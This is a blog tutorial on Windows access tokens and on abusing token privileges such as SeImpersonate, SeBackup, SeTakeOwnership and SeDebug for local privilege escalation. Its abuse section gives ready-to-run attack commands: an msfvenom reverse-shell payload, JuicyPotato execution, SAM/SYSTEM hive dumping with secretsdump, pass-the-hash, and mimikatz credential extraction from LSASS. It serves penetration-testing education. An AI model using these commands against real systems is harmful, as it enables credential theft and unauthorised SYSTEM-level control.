---
layout: single
title: Windows Access Tokens
date: 2023-09-12 
toc: true
classes: wide
excerpt: "Learn what access tokens are in windows and how they can be abused!"
header:
  teaser: /assets/images/articles/AccessTokens/teaser.png
  teaser_home_page: true
categories:
  - articles
tags:
  - windows
---


# What Are Access Tokens?

Every system user who logs in is assigned an access token containing security details for their session. When a user logs in, the system generates an access token for them. Each process initiated on behalf of the user is equipped with a duplicate of this access token. This token serves to identify the user, their associated groups, and their granted privileges. Additionally, the token includes a logon SID (Security Identifier) that distinguishes the current logon session.

In the first paragraph I mentioned that a token contains granted privileges for the security context, but what are these privileges? Privileges are a subset of the information contained within a token. Privileges are specific rights or permissions that are assigned to user accounts or processes. These rights determine what actions or operations a user or process can perform on the system. Examples of privileges include the right to shut down the system, the right to change system time, or the right to take ownership of files. Privileges are part of a user's or process's security context and are checked when attempting to perform privileged actions.


![Allports](/assets/images/articles/AccessTokens/AccessTokens.png)


One useful command that can be used directly in the windows command line is  `whoami /all` , this command will list user information, group information and privilege information. 

![whoami](/assets/images/articles/AccessTokens/whoami.jpg)


# Local Administrator and UAC

When a local administrator logs in, the system generates two access tokens: one with administrative privileges and another with standard user rights. By default, when this user runs a process, the token with standard (non-administrator) rights is employed. However, if the user attempts to execute a task as an administrator (e.g., using "Run as Administrator"), the User Account Control (UAC) will prompt for permission. With UAC, each application that requires the administrator access token must prompt the end user for consent. The only exception is the relationship that exists between parent and child processes. Child processes inherit the user's access token from the parent process. Both the parent and child processes, however, must have the same integrity level. You have probably already interacted with windows UAC when trying to install a program, the prompt usually looks like this: 


![UAC](/assets/images/articles/AccessTokens/uac.png)


# Types of Access Tokens

## Primary Token

Primary tokens can only be associated to processes, and they represent a process's security subject. The creation of primary tokens and their association to processes are both privileged operations, requiring two different privileges in the name of privilege separation - the typical scenario sees the authentication service creating the token, and a logon service associating it to the user's operating system shell. Processes initially inherit a copy of the parent process's primary token.

## Impersonation Token

Impersonation is a security concept implemented in Windows NT that allows a server application to temporarily "be" the client in terms of access to secure objects. Impersonation has four possible levels:

- **Anonymous**, giving the server the access of an anonymous/unidentified user
- **Identification**, letting the server inspect the client's identity but not use that identity to access objects
- **Impersonation**, letting the server act on behalf of the client
- **Delegation**, same as impersonation but extended to remote systems to which the server connects (through the preservation of credentials).

The client has the option to specify the highest level of impersonation (if any) that the server can use as a connection parameter. Both delegation and impersonation are actions with elevated privileges. Impersonation tokens are exclusively linked to threads and symbolize the security context of a client process. Typically, impersonation tokens are generated and linked to the current thread automatically through interprocess communication methods like DCE RPC, DDE, and named pipes.


# Token Privileges Abuse

In this section I will be listing some of the granted privileges that can be abused in an access token. A full list of techniques used on these privileges can be found here:  [Priv2Admin](https://github.com/gtworek/Priv2Admin) .

## SeImpersonatePrivilege

Any process holding this privilege can impersonate (but not create) any token for which it is able to gethandle. You can get a privileged token from a Windows service (DCOM) making it perform an NTLM authentication against the exploit, then execute a process as SYSTEM. Exploit it with juicy-potato, RogueWinRM (needs winrm disabled), SweetPotato, PrintSpoofer.

The process using, for example, juicy-potato would be the following:

1. Trick the “NT AUTHORITY\SYSTEM” account into authenticating via NTLM to a TCP endpoint we control.
2. Man-in-the-middle this authentication attempt (NTLM relay) to locally negotiate a security token for the “NT AUTHORITY\SYSTEM” account. This is done through a series of Windows API calls.
3. Impersonate the token we have just negotiated. This can only be done if the attackers current account has the privilege to impersonate security tokens. This is usually true of most service accounts and not true of most user-level accounts.
4. Run payload with impersonated token.

So we would need to have two files in the victim machine, a payload to execute and the juicy-potato executable that can be found here [juicy-potato](https://github.com/ohpe/juicy-potato) . The payload can be generated with msfvenom like this:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=80 -a x64 --platform Windows -f exe -o shell.exe
```

Then we would execute the payload with juicy-potato on the victim machine and set a listener on our machine to gain NT Authority System privileges.

```bash
C:\temp\JuicyPotato.exe -t * -p C:\temp\shell.exe -l 443
```

## SeAssignPrimaryPrivilege

It is very similar to SeImpersonatePrivilege, it will use the same method to get a privileged token.
Then, this privilege allows to assign a primary token to a new/suspended process. With the privileged impersonation token you can derivate a primary token (DuplicateTokenEx).
With the token, you can create a new process with 'CreateProcessAsUser' or create a process suspended and set the token (in general, you cannot modify the primary token of a running process).

## SeTcbPrivilege

There is an interesting logon type in Windows known as S4U logon . It is effectively described in an MSDN blog post as follows:
 
  “In Windows, it is possible to logon as a different domain user without any
  credentials.  This is known as a S4U or a Service For User Logon.  This is
  a Microsoft Extension to Kerberos introduced with Windows Server 2003.”

If you have enabled this token you can use KERB_S4U_LOGON to get an impersonation token for any other user without knowing the credentials, add an arbitrary group (admins) to the token, set the integrity level of the token to "medium", and assign this token to the current thread (SetThreadToken). 

## SeBackupPrivilege

This privilege causes the system to grant all read access control to any file (only read).
Use it to read the password hashes of local Administrator accounts from the registry and then use "psexec" or "wmicexec" with the hash (PTH). This attack won't work if the Local Administrator is disabled, or if it is configured that a Local Admin isn't admin if he is connected remotely.

Combined with SeRestorePrivilege, the execution path can be as follows:

1. Enable the privilege in the token

2. Export the HKLM\SAM and HKLM\SYSTEM registry hives: `cmd /c "reg save HKLM\SAM SAM & reg save HKLM\SYSTEM SYSTEM"`

3. Eventually transfer the exported hives on a controlled computer

4. Extract the local accounts hashes from the export SAM hive. For example using Impacket's secretsdump.py Python script: `secretsdump.py -sam SAM -system SYSTEM LOCAL`

5. Authenticate as the local built-in Administrator, or another member of the local Administrators group, using its NTLM hash (Pass-the-Hash). For example using Impacket's psexec.py Python script: `psexec.py -hashes ":ADMINISTRATOR_NTLM" Administrator@TARGET_IP`


## SeRestorePrivilege

Establishes write access control to any file on the system, regardless of the file's access control list (ACL), opens up various avenues for elevation. This includes the ability to alter services, engage in DLL hijacking, and configure a debugger using features like Image File Execution Options. These options provide numerous paths for privilege escalation.


## SeTakeOwnershipPrivilege

This privilege is very similar to SeRestorePrivilege. It allows a process to “take ownership of an object without being granted discretionary access” by granting the WRITE_OWNER access right.
First, you have to take ownership of the registry key that you are going to write on and modify the DACL so you can write on it.

```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant your_username:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```


## SeDebugPrivilege

It allows the holder to debug another process, this includes reading and writing to that process' memory. One example of abuse of this privilege is to run ProcDump from the SysInternals to dump a process memory. For example, the Local Security Authority Subsystem Service (LSASS) process, which stores user credentials after a user logs on to a system. You can then load this dump in mimikatz to obtain passwords:

```
mimikatz.exe
mimikatz# log
mimikatz# sekurlsa::minidump lsass.dmp
mimikatz# sekurlsa::logonpasswords
```

You could also try to escalate privileges using [psgetsys](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) :

```powershell
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(system_pid,command_to_execute)
```



# References

Most of the contents in this post are from the following sources:

- [Hacktricks](https://book.hacktricks.xyz/)
- [Abusing Token Privileges For LPE](https://www.exploit-db.com/exploits/42556)
- [Microsoft Documentation](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
- [FoxGlove Security](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)